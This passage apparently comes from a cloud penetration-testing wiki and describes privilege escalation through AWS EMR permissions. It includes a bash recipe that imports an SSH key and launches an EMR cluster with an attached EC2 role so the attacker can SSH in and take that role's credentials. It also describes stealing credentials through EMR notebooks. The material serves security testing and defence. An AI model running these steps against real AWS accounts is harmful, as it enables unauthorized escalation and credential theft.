### `iam:PassRole`, `elasticmapreduce:RunJobFlow`

An attacker with these permissions can **run a new EMR cluster attaching EC2 roles** and try to steal its credentials.\
Note that in order to do this you would need to **know some ssh priv key imported in the account** or to import one, and be able to **open port 22 in the master node** (you might be able to do this with the attributes `EmrManagedMasterSecurityGroup` and/or `ServiceAccessSecurityGroup` inside `--ec2-attributes`).

```bash
# Import EC2 ssh key (you will need extra permissions for this)
ssh-keygen -b 2048 -t rsa -f /tmp/sshkey -q -N ""
chmod 400 /tmp/sshkey
base64 /tmp/sshkey.pub > /tmp/pub.key
aws ec2 import-key-pair \
    --key-name "privesc" \
    --public-key-material file:///tmp/pub.key


aws emr create-cluster \
    --release-label emr-5.15.0 \
    --instance-type m4.large \
    --instance-count 1 \
    --service-role EMR_DefaultRole \
    --ec2-attributes InstanceProfile=EMR_EC2_DefaultRole,KeyName=privesc

# Wait 1min and connect via ssh to an EC2 instance of the cluster)
aws emr describe-cluster --cluster-id <id>
# In MasterPublicDnsName you can find the DNS to connect to the master instance
## You cna also get this info listing EC2 instances
```

Note how an **EMR role** is specified in `--service-role` and a **ec2 role** is specified in `--ec2-attributes` inside `InstanceProfile`. However, this technique only allows to steal the EC2 role credentials (as you will connect via ssh) but no the EMR IAM Role.

**Potential Impact:** Privesc to the EC2 service role specified.

### `elasticmapreduce:CreateEditor`, `iam:ListRoles`, `elasticmapreduce:ListClusters`, `iam:PassRole`, `elasticmapreduce:DescribeEditor`, `elasticmapreduce:OpenEditorInConsole`

With these permissions an attacker can go to the **AWS console**, create a Notebook and access it to steal the IAM Role.

> [!CAUTION]
> Even if you attach an IAM role to the notebook instance in my tests I noticed that I was able to steal AWS managed credentials and not creds related to the IAM role related.

**Potential Impact:** Privesc to AWS managed role arn:aws:iam::420254708011:instance-profile/prod-EditorInstanceProfile

### `elasticmapreduce:OpenEditorInConsole`

Just with this permission an attacker will be able to access the **Jupyter Notebook and steal the IAM role** associated to it.\
The URL of the notebook is `https://<notebook-id>.emrnotebooks-prod.eu-west-1.amazonaws.com/<notebook-id>/lab/`

> [!CAUTION]
> Even if you attach an IAM role to the notebook instance in my tests I noticed that I was able to steal AWS managed credentials and not creds related to the IAM role related

**Potential Impact:** Privesc to AWS managed role arn:aws:iam::420254708011:instance-profile/prod-EditorInstanceProfile
